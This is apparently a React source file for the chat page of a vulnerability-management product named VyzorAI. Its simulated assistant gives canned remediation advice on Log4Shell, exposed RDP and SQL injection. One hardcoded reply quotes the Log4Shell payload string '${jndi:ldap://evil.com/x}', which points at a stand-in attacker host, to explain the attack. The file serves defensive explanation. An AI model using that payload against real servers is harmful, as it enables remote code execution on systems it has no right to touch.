'use client';

import { useState, useRef, useEffect } from 'react';

const GLASS: React.CSSProperties = {
  background: 'rgba(255,255,255,0.07)',
  backdropFilter: 'blur(18px)',
  WebkitBackdropFilter: 'blur(18px)',
  border: '1px solid rgba(255,255,255,0.13)',
  boxShadow: '0 4px 28px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.1)',
};

type Message = {
  role: 'user' | 'ai';
  text: string;
  ts: string;
};

const HISTORY = [
  { id: 1, title: 'Explain Log4Shell impact', ago: '2h ago' },
  { id: 2, title: 'How to fix RDP exposure?', ago: 'Yesterday' },
  { id: 3, title: 'CVSS vs EPSS difference', ago: '2d ago' },
  { id: 4, title: 'Generate pentest report', ago: '3d ago' },
  { id: 5, title: 'SSL best practices', ago: '5d ago' },
];

const SUGGESTIONS = [
  'Explain the Log4Shell vulnerability on my assets',
  'What should I fix first based on my risk score?',
  'Generate an executive summary of my findings',
  'How do I remediate SQL injection?',
];

const DEMO_MESSAGES: Message[] = [
  {
    role: 'user',
    text: 'What are the most critical issues I need to fix right now?',
    ts: '09:14',
  },
  {
    role: 'ai',
    text: `Based on your current scan data, here are the **top 3 critical issues** requiring immediate attention:\n\n**1. Log4Shell (CVE-2021-44228)** — CRITICAL\nYour api.acmecorp.com is running Apache Log4j 2.14.1. This is actively exploited in the wild with a CVSS score of 10.0. Patch to Log4j 2.17.1+ immediately.\n\n**2. Open RDP Port (3389)** — HIGH\nRemote Desktop Protocol is exposed on admin.acmecorp.com. This is a common ransomware entry point. Restrict to VPN-only or close the port.\n\n**3. SQL Injection on /api/search** — HIGH\nYour search endpoint on techstart.io is vulnerable to blind SQL injection. Sanitize all user inputs and use parameterized queries.\n\n**Recommended priority:** Fix Log4Shell first — it's weaponized and trivially exploitable.`,
    ts: '09:14',
  },
  {
    role: 'user',
    text: 'How long would it take to fix the Log4Shell vulnerability?',
    ts: '09:16',
  },
  {
    role: 'ai',
    text: `For Log4Shell remediation on api.acmecorp.com, here is a realistic timeline:\n\n**Immediate (0–2 hours)**\n• Set JVM flag: -Dlog4j2.formatMsgNoLookups=true as a temporary mitigation\n• Block JNDI-related traffic at WAF/firewall level\n\n**Short-term (2–8 hours)**\n• Identify all Log4j dependencies with: mvn dependency:tree | grep log4j\n• Update pom.xml or build.gradle to Log4j 2.17.1+\n• Run your test suite to validate no regressions\n\n**Deployment (8–24 hours)**\n• Build and deploy patched version through your CI/CD pipeline\n• Verify patch with a safe JNDI probe in staging\n• Monitor logs for any exploitation attempts post-patch\n\nTotal estimated time: **4–24 hours** depending on your deployment pipeline complexity. The JVM flag buys you time without a full deploy.`,
    ts: '09:17',
  },
];

function getAIResponse(input: string): string {
  const lower = input.toLowerCase();
  if (lower.includes('log4shell') || lower.includes('log4j')) {
    return `Log4Shell (CVE-2021-44228) is a critical remote code execution vulnerability in Apache Log4j 2.x. Here is what you need to know about your environment:\n\n**Affected asset:** api.acmecorp.com (Log4j 2.14.1)\n**CVSS Score:** 10.0 (Critical)\n**Exploit status:** Actively weaponized since December 2021\n\n**Why it matters:** Attackers send a crafted string like \${jndi:ldap://evil.com/x} in any logged field (headers, user-agents, form inputs). Log4j fetches and executes remote code — no auth required.\n\n**Fix:** Upgrade to Log4j 2.17.1+. Intermediate mitigation: set -Dlog4j2.formatMsgNoLookups=true.`;
  }
  if (lower.includes('fix first') || lower.includes('risk score') || lower.includes('priority')) {
    return `Based on your risk score of 72/100 and EPSS data, here is your recommended fix order:\n\n**Priority 1 — Log4Shell on api.acmecorp.com**\nEPSS: 97.4% exploitation probability. Patch immediately.\n\n**Priority 2 — Open RDP (admin.acmecorp.com)**\nExposed to internet. High ransomware risk. Restrict to VPN.\n\n**Priority 3 — SQL Injection (techstart.io/api/search)**\nData breach risk. Use parameterized queries.\n\nFixing these 3 would drop your risk score to approximately 38/100.`;
  }
  if (lower.includes('executive') || lower.includes('summary') || lower.includes('report')) {
    return `**Executive Security Summary — May 2025**\n\nYour organization has **11 open vulnerabilities** across 2 external targets.\n\n🔴 Critical (1): Log4Shell — immediate action required\n🟠 High (3): RDP exposure, SQL injection, weak TLS\n🔵 Medium/Low (7): SSH config, header issues, cookie flags\n\n**Risk Score: 72/100** (down from 84 last month)\n**Mean Time to Detect:** 2.3 days\n**Cyber Hygiene:** Top 15% of similar organizations\n\n**Next steps:** Patch Log4Shell this week. Schedule RDP remediation sprint for next week.`;
  }
  if (lower.includes('sql') || lower.includes('injection')) {
    return `SQL Injection remediation steps for techstart.io/api/search:\n\n**Root cause:** User input is concatenated directly into SQL queries.\n\n**Fix (Node.js example):**\n\`\`\`js\n// Vulnerable\ndb.query("SELECT * FROM items WHERE name = '" + input + "'")\n\n// Fixed — parameterized query\ndb.query("SELECT * FROM items WHERE name = ?", [input])\n\`\`\`\n\n**Also do:**\n• Enable a WAF rule for SQLi patterns\n• Run OWASP ZAP against your staging environment\n• Add input validation at the API gateway layer\n\nEstimated fix time: 2–4 hours for a developer familiar with your codebase.`;
  }
  return `I have analyzed your attack surface. You currently have **11 open issues** across 2 targets (acmecorp.com, techstart.io).\n\n**Most critical:** Log4Shell on api.acmecorp.com (CVSS 10.0) — actively exploited, patch urgently.\n\n**Your risk score:** 72/100\n\nWould you like me to walk you through remediation steps, generate an executive summary, or help prioritize your fix list?`;
}

function nowTime() {
  return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

export default function AIPage() {
  const [messages, setMessages] = useState<Message[]>(DEMO_MESSAGES);
  const [input, setInput] = useState('');
  const [loading, setLoading] = useState(false);
  const [activeHistory, setActiveHistory] = useState<number | null>(1);
  const bottomRef = useRef<HTMLDivElement>(null);
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, loading]);

  const send = (text: string) => {
    if (!text.trim() || loading) return;
    const ts = nowTime();
    setMessages(prev => [...prev, { role: 'user', text: text.trim(), ts }]);
    setInput('');
    setLoading(true);
    setTimeout(() => {
      setMessages(prev => [
        ...prev,
        { role: 'ai', text: getAIResponse(text), ts: nowTime() },
      ]);
      setLoading(false);
    }, 950);
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      send(input);
    }
  };

  return (
    <div style={{ display: 'flex', height: '100vh', overflow: 'hidden' }}>
      {/* Left Sidebar */}
      <div
        style={{
          width: '256px',
          flexShrink: 0,
          display: 'flex',
          flexDirection: 'column',
          height: '100%',
          ...GLASS,
          borderRadius: 0,
          borderTop: 'none',
          borderBottom: 'none',
          borderLeft: 'none',
        }}
      >
        {/* Sidebar header */}
        <div
          style={{
            padding: '20px 16px 16px',
            borderBottom: '1px solid rgba(255,255,255,0.08)',
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '14px' }}>
            <div
              style={{
                width: '32px',
                height: '32px',
                borderRadius: '10px',
                background: 'linear-gradient(135deg, #a78bfa, #6d28d9)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                flexShrink: 0,
              }}
            >
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2">
                <circle cx="12" cy="12" r="3" />
                <path d="M12 2v3M12 19v3M2 12h3M19 12h3M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12" />
              </svg>
            </div>
            <span style={{ color: '#f0fdf4', fontWeight: 900, fontSize: '1rem' }}>VyzorAI</span>
            <span
              style={{
                background: 'rgba(167,139,250,0.18)',
                color: '#a78bfa',
                fontSize: '0.65rem',
                fontWeight: 700,
                padding: '2px 7px',
                borderRadius: '999px',
                border: '1px solid rgba(167,139,250,0.3)',
                letterSpacing: '0.04em',
              }}
            >
              AI
            </span>
          </div>

          {/* New conversation button */}
          <button
            onClick={() => { setMessages([]); setActiveHistory(null); }}
            style={{
              width: '100%',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '6px',
              padding: '9px 12px',
              borderRadius: '10px',
              background: '#34d399',
              color: '#021a12',
              fontWeight: 700,
              fontSize: '0.8rem',
              border: 'none',
              cursor: 'pointer',
            }}
          >
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
              <line x1="12" y1="5" x2="12" y2="19" />
              <line x1="5" y1="12" x2="19" y2="12" />
            </svg>
            New conversation
          </button>
        </div>

        {/* History list */}
        <div style={{ flex: 1, overflowY: 'auto', padding: '12px 8px' }}>
          <p
            style={{
              fontSize: '0.68rem',
              fontWeight: 700,
              textTransform: 'uppercase',
              letterSpacing: '0.07em',
              color: 'rgba(167,243,208,0.4)',
              padding: '0 8px',
              marginBottom: '6px',
            }}
          >
            Recent
          </p>
          {HISTORY.map(h => (
            <button
              key={h.id}
              onClick={() => setActiveHistory(h.id)}
              style={{
                width: '100%',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'flex-start',
                gap: '2px',
                padding: '9px 10px',
                borderRadius: '9px',
                border: 'none',
                cursor: 'pointer',
                background: activeHistory === h.id ? 'rgba(52,211,153,0.1)' : 'transparent',
                marginBottom: '2px',
                textAlign: 'left',
              }}
            >
              <span
                style={{
                  fontSize: '0.8rem',
                  color: activeHistory === h.id ? '#f0fdf4' : 'rgba(167,243,208,0.7)',
                  fontWeight: activeHistory === h.id ? 600 : 400,
                  whiteSpace: 'nowrap',
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                  width: '100%',
                }}
              >
                {h.title}
              </span>
              <span style={{ fontSize: '0.68rem', color: 'rgba(167,243,208,0.4)' }}>{h.ago}</span>
            </button>
          ))}
        </div>

        {/* Credits footer */}
        <div
          style={{
            padding: '14px 16px',
            borderTop: '1px solid rgba(255,255,255,0.08)',
          }}
        >
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
            <span style={{ fontSize: '0.75rem', color: 'rgba(167,243,208,0.55)', fontWeight: 500 }}>
              Queries this month
            </span>
            <span style={{ fontSize: '0.75rem', color: '#f0fdf4', fontWeight: 700 }}>47 / 500</span>
          </div>
          <div
            style={{
              height: '5px',
              borderRadius: '99px',
              background: 'rgba(255,255,255,0.1)',
              overflow: 'hidden',
            }}
          >
            <div
              style={{
                height: '100%',
                width: `${(47 / 500) * 100}%`,
                borderRadius: '99px',
                background: '#34d399',
              }}
            />
          </div>
          <p style={{ fontSize: '0.68rem', color: 'rgba(167,243,208,0.4)', marginTop: '5px' }}>
            453 queries remaining
          </p>
        </div>
      </div>

      {/* Main chat area */}
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', height: '100%', minWidth: 0 }}>
        {/* Chat messages */}
        <div
          style={{
            flex: 1,
            overflowY: 'auto',
            padding: '32px 40px',
          }}
        >
          {messages.length === 0 ? (
            /* Welcome state */
            <div
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                height: '100%',
                textAlign: 'center',
              }}
            >
              <div
                style={{
                  width: '72px',
                  height: '72px',
                  borderRadius: '20px',
                  background: 'linear-gradient(135deg, rgba(167,139,250,0.18), rgba(109,40,217,0.18))',
                  border: '1px solid rgba(167,139,250,0.3)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '20px',
                }}
              >
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" strokeWidth="1.5">
                  <circle cx="12" cy="12" r="3" />
                  <path d="M12 2v3M12 19v3M2 12h3M19 12h3M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12" />
                </svg>
              </div>
              <h2
                style={{
                  fontSize: '1.5rem',
                  fontWeight: 900,
                  color: '#f0fdf4',
                  marginBottom: '8px',
                }}
              >
                Your AI Security Analyst
              </h2>
              <p style={{ color: 'rgba(167,243,208,0.55)', fontSize: '0.9rem', marginBottom: '36px', maxWidth: '420px' }}>
                Ask me anything about your vulnerabilities, scan results, or security best practices.
              </p>

              {/* Suggestion chips */}
              <div
                style={{
                  display: 'grid',
                  gridTemplateColumns: '1fr 1fr',
                  gap: '10px',
                  maxWidth: '600px',
                  width: '100%',
                }}
              >
                {SUGGESTIONS.map((s, i) => (
                  <button
                    key={i}
                    onClick={() => send(s)}
                    style={{
                      padding: '14px 16px',
                      borderRadius: '12px',
                      ...GLASS,
                      color: 'rgba(167,243,208,0.7)',
                      fontSize: '0.82rem',
                      fontWeight: 500,
                      textAlign: 'left',
                      cursor: 'pointer',
                      lineHeight: 1.4,
                      transition: 'all 0.15s',
                    }}
                    onMouseEnter={e => {
                      (e.currentTarget as HTMLButtonElement).style.background = 'rgba(52,211,153,0.1)';
                      (e.currentTarget as HTMLButtonElement).style.borderColor = 'rgba(52,211,153,0.25)';
                      (e.currentTarget as HTMLButtonElement).style.color = '#f0fdf4';
                    }}
                    onMouseLeave={e => {
                      (e.currentTarget as HTMLButtonElement).style.background = 'rgba(255,255,255,0.07)';
                      (e.currentTarget as HTMLButtonElement).style.borderColor = 'rgba(255,255,255,0.13)';
                      (e.currentTarget as HTMLButtonElement).style.color = 'rgba(167,243,208,0.7)';
                    }}
                  >
                    {s}
                  </button>
                ))}
              </div>
            </div>
          ) : (
            <div style={{ maxWidth: '760px', margin: '0 auto', display: 'flex', flexDirection: 'column', gap: '20px' }}>
              {messages.map((msg, i) => (
                <div
                  key={i}
                  style={{
                    display: 'flex',
                    gap: '12px',
                    justifyContent: msg.role === 'user' ? 'flex-end' : 'flex-start',
                  }}
                >
                  {msg.role === 'ai' && (
                    <div
                      style={{
                        width: '34px',
                        height: '34px',
                        borderRadius: '10px',
                        background: 'linear-gradient(135deg, #a78bfa, #6d28d9)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        flexShrink: 0,
                        marginTop: '2px',
                      }}
                    >
                      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2">
                        <circle cx="12" cy="12" r="3" />
                        <path d="M12 2v3M12 19v3M2 12h3M19 12h3" />
                      </svg>
                    </div>
                  )}

                  <div
                    style={{
                      maxWidth: '580px',
                      padding: '12px 16px',
                      borderRadius: '14px',
                      ...(msg.role === 'user'
                        ? {
                            background: 'rgba(52,211,153,0.15)',
                            border: '1px solid rgba(52,211,153,0.25)',
                            color: '#f0fdf4',
                          }
                        : {
                            ...GLASS,
                            color: '#f0fdf4',
                          }),
                      fontSize: '0.875rem',
                      lineHeight: 1.65,
                      whiteSpace: 'pre-line',
                    }}
                  >
                    {msg.text}
                    <p style={{ fontSize: '0.68rem', color: 'rgba(167,243,208,0.4)', marginTop: '8px' }}>
                      {msg.ts}
                    </p>
                  </div>

                  {msg.role === 'user' && (
                    <div
                      style={{
                        width: '34px',
                        height: '34px',
                        borderRadius: '10px',
                        background: 'linear-gradient(135deg, #34d399, #059669)',
                        display: 'flex',
                        alignItems: 'center',
                        justifyContent: 'center',
                        flexShrink: 0,
                        marginTop: '2px',
                        color: '#021a12',
                        fontWeight: 800,
                        fontSize: '0.7rem',
                      }}
                    >
                      AB
                    </div>
                  )}
                </div>
              ))}

              {loading && (
                <div style={{ display: 'flex', gap: '12px' }}>
                  <div
                    style={{
                      width: '34px',
                      height: '34px',
                      borderRadius: '10px',
                      background: 'linear-gradient(135deg, #a78bfa, #6d28d9)',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                      flexShrink: 0,
                    }}
                  >
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2">
                      <circle cx="12" cy="12" r="3" />
                      <path d="M12 2v3M12 19v3M2 12h3M19 12h3" />
                    </svg>
                  </div>
                  <div
                    style={{
                      ...GLASS,
                      borderRadius: '14px',
                      padding: '14px 20px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                    }}
                  >
                    {[0, 1, 2].map(j => (
                      <div
                        key={j}
                        style={{
                          width: '7px',
                          height: '7px',
                          borderRadius: '50%',
                          background: '#34d399',
                          animation: 'bounce 1s infinite',
                          animationDelay: `${j * 0.18}s`,
                        }}
                      />
                    ))}
                  </div>
                </div>
              )}

              <div ref={bottomRef} />
            </div>
          )}
        </div>

        {/* Input bar */}
        <div
          style={{
            padding: '16px 40px 20px',
            borderTop: '1px solid rgba(255,255,255,0.08)',
            background: 'rgba(2,26,18,0.6)',
          }}
        >
          <div style={{ maxWidth: '760px', margin: '0 auto' }}>
            <div
              style={{
                display: 'flex',
                alignItems: 'flex-end',
                gap: '10px',
                padding: '10px 12px 10px 16px',
                borderRadius: '14px',
                background: 'rgba(255,255,255,0.06)',
                border: '1px solid rgba(255,255,255,0.14)',
              }}
            >
              <textarea
                ref={textareaRef}
                value={input}
                onChange={e => setInput(e.target.value)}
                onKeyDown={handleKeyDown}
                placeholder="Ask VyzorAI about your vulnerabilities..."
                rows={1}
                style={{
                  flex: 1,
                  background: 'transparent',
                  border: 'none',
                  outline: 'none',
                  resize: 'none',
                  color: '#f0fdf4',
                  fontSize: '0.875rem',
                  lineHeight: 1.5,
                  minHeight: '24px',
                  maxHeight: '140px',
                  fontFamily: 'inherit',
                }}
              />
              <button
                onClick={() => send(input)}
                disabled={!input.trim() || loading}
                style={{
                  width: '34px',
                  height: '34px',
                  borderRadius: '10px',
                  background: input.trim() && !loading ? '#34d399' : 'rgba(255,255,255,0.1)',
                  border: 'none',
                  cursor: input.trim() && !loading ? 'pointer' : 'default',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  flexShrink: 0,
                  transition: 'all 0.15s',
                }}
              >
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke={input.trim() && !loading ? '#021a12' : 'rgba(167,243,208,0.4)'}
                  strokeWidth="2.5"
                >
                  <line x1="12" y1="19" x2="12" y2="5" />
                  <polyline points="5 12 12 5 19 12" />
                </svg>
              </button>
            </div>
            <p
              style={{
                textAlign: 'center',
                fontSize: '0.7rem',
                color: 'rgba(167,243,208,0.4)',
                marginTop: '8px',
              }}
            >
              VyzorAI has access to your scan data and vulnerability history · Always verify critical security decisions
            </p>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes bounce {
          0%, 80%, 100% { transform: translateY(0); }
          40% { transform: translateY(-6px); }
        }
      `}</style>
    </div>
  );
}
